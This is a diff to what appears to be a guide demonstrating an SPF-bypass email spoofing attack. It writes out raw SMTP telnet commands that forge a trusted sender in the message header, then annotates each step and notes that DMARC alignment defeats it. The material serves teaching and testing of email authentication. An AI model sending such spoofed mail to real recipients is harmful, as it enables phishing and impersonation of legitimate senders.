@@ -16,6 +16,7 @@ Upon completion of the above 3 steps, you'll be able to successfully demonstrate
 
 To perform an SPF-bypass attack, simply run the below telnet commands that can be executed on any Windows or Linux endpoint. Replace <target.mailserver.com> with the target mail server you're delivering the spoofed email to (i.e. the recipient - lookup the MX record of the recipient domain to identify this), replace <attacker@attackerdomain.com> with the domain you procured and setup earlier, replace <Legitimate_Sender@spoofed.com> with the address and domain you're spoofing and replace <target@target.com.au> with your target recipient.
 
+
     telnet target.mailserver.com 25
     helo attackerdomain.com
     mail from: attacker@attackerdomain.com
@@ -27,3 +28,14 @@ To perform an SPF-bypass attack, simply run the below telnet commands that can b
     This is a test
 
     .
+What we're abusing here is a weakness in the way emails are delivered, authenticated and presented to a users screen. If we break down each component of the above mail delivery we can see how the SPF-bypass abuses a domain misalignment between the 'SMTP MailFrom' and 'Mail Header From':
+
+    telnet target.mailserver.com 25 
+    helo attackerdomain.com <--- If the SMTP.MailFrom is empty (row below), SPF authentication instead relies on the SMTP.helo
+    mail from: attacker@attackerdomain.com <-- This is where SPF checks are typically performed. If we mis-align this to the 'Mail Header From' we can trick the recipient
+    rcpt to: target@target.com.au
+    data
+    from: "Sender, Legitimate" <Legitimate_Sender@spoofed.com> <--- This is where SPF-bypass occurs - DMARC protects against this by performing an alignment check betwen both 'From' values
+    to: target@target.com.au
+    subject: Presentation - Email Demo
+    This is a test
